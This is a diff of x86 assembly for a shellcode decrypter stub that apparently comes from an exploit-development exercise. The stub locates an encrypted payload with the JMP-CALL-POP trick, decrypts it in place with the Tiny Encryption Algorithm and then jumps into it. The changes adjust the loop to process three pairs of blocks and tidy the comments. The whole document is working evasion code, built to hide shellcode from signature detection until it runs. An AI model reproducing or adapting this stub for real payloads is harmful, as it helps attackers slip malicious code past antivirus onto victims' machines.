@@ -4,20 +4,14 @@
 ; https://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm
 
 global _start
-; EAX = SUM
+; EAX = SUM result
 ; ECX = COUNTER
-; EBX = v0 chunk
-; EDX = FREE, used to store temporary values
+; EBX = current chunk
+; EDX = sum
 ; ESI = *encrypted_shellcode
 ; EDI = *key
 section .text
 _start:
-	xor ecx,ecx							; clear ECX
-	mul ecx								; trick to clear EAX
-	xor ebx, ebx						; clear EBX
-	xor edx, edx						; clear EDX
-	xor esi, esi						; clear ESI
-	xor edi, edi						; clear EDI
 	jmp short key_section				; goto key_section
 
 key_section:
@@ -36,14 +30,14 @@ key_loader:
 
 decoder:								; decoder
 	pop esi								; load address of our encrypted_shellcode into ESI (JMP CALL POP trick)
-	mov cl, 6							; load the number of our shellcode chunks, used to loop. (shellcode length is 24. 24/4(DWORD)=6)
+	mov ecx, 3							; load the number of our shellcode chunks, used to loop. (shellcode length is 24. 24/4(DWORD)=6 blocks/2(chunks taken 2by 2)=3)
 
 decrypt_loop:
 	push ecx							; save counter status before entering 32 iteration loop
     mov ecx, 32							; store loop counter, we nedd to cycle x32 times
 	mov edx, 0xC6EF3720					; EDX = sum
 	loop_32:
-		mov ebx, dword [esi]				; v0 load encrypted_shellcode's chunk DWORD pointed by ESI in EBX | EBX=A
+		mov ebx, dword [esi]			; v0 load encrypted_shellcode's chunk DWORD pointed by ESI in EBX | EBX=A
 		; v1 = v1-((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3)
 		mov eax, ebx					; v0 is now in EAX
 		shl eax, 4						; v0<<4
@@ -84,7 +78,7 @@ decrypt_loop:
 		push eax						; store decrypted v0 on stack
 		; sum = sum-delta
 		sub	edx, 0x9E3779B9				; sum = sum-delta
-		loop loop_32					; CL is 0? No, we go back at loop_32 and execute the cicle again
+		loop loop_32					; ECX is 0? No, we go back at loop_32 and execute the cicle again
 	; save decrypted v0, v1
 	save:
 	pop eax								; EAX=v1
@@ -99,8 +93,8 @@ decrypt_loop:
 	; ------
 	pop ecx								; restore ECX counter status
 	add esi, 8							; select next chunk "couple"				
-    loop decrypt_loop					; CL is 0? No, we go back at decrypt_loop and execute the cicle again
-    jmp short encrypted_shellcode		; CL is 0! We've decrypted our shellcode and we can now directly jump into it
+    loop decrypt_loop					; ECX is 0? No, we go back at decrypt_loop and execute the cicle again
+    jmp short encrypted_shellcode		; ECX is 0! We've decrypted our shellcode and we can now directly jump into it
 
 shellcode_section:
         call decoder					; goto decoder, putting encrypted_shellcode on the stack
